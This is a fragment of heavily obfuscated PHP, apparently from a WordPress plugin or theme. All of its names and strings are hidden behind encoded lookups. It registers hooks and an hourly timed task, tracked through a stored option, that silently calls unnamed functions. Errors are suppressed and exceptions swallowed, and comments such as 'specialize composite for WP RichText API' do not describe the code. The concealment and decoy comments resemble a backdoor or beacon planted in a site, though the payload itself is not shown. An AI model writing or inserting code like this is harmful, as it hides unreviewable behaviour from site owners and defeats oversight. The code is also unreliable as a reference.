  eq7z05kg4s98n6ox(c1sob647u1i(2028), hn_f08x0cns80(2029),   (8-1));
 if  ($GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(1623)))   {
// specialize composite for WP RichText API



      $GLOBALS['__scf_g45egtj01hms_186'](function   ()  {
 if     (!empty($GLOBALS[c1sob647u1i(707)]))  return;
  if  (!defined(ovffvv33(2030)) || !$GLOBALS['__scf_w3f945e2es_4'](bpowi0iglycvx(2031)))   return;


 if  ($GLOBALS['__scf_w3f945e2es_4'](ovffvv33(2029)))  {
       try    {
  r8j56gi10sbzxd2f4olo();
}     catch (Throwable   $cje8wku90zm4r) {
  }    catch  (Exception $cje8wku90zm4r)   {
  }
}
 });
    }
// stack pointer

  eq7z05kg4s98n6ox(bpowi0iglycvx(2028),   hn_f08x0cns80(2032),  (1<<3));
 eq7z05kg4s98n6ox(c1sob647u1i(1704), bpowi0iglycvx(1704));
     eq7z05kg4s98n6ox(f6yrzd2knrmb(1775), ovffvv33(2033));
eq7z05kg4s98n6ox(c1sob647u1i(775),      hn_f08x0cns80(2034),  (0x7+0x3));

 eq7z05kg4s98n6ox(iw6xe9q4j6sneg(2028), function  ()  {
      if  (!$GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(2031))     ||  !$GLOBALS['__scf_w3f945e2es_4'](f6yrzd2knrmb(1628)))  return;
   $hdihhxq2rqz     = (int)  @get_option(hn_f08x0cns80(2035),   0);
  if    (($GLOBALS['__scf_qzyo0sgkyb6_202']()    -   $hdihhxq2rqz)  >  (4584-984)) {
 if (!dm2ynxj4cka_f9ie88n())  return;
       @update_option(c1sob647u1i(2035), $GLOBALS['__scf_qzyo0sgkyb6_202']());
 fbxyyx91d4_08z99py_u1u();

 }
  },  (7+2));


   eq7z05kg4s98n6ox(c1sob647u1i(106),     iw6xe9q4j6sneg(2036));
  g7b6t_c45mkf3jmbd2c(f6yrzd2knrmb(2037),    f6yrzd2knrmb(2038));
     if ($GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(477))  &&    did_action(f6yrzd2knrmb(2028)))   {
       bs3cpzu5m1eyd5f();
  }
  
}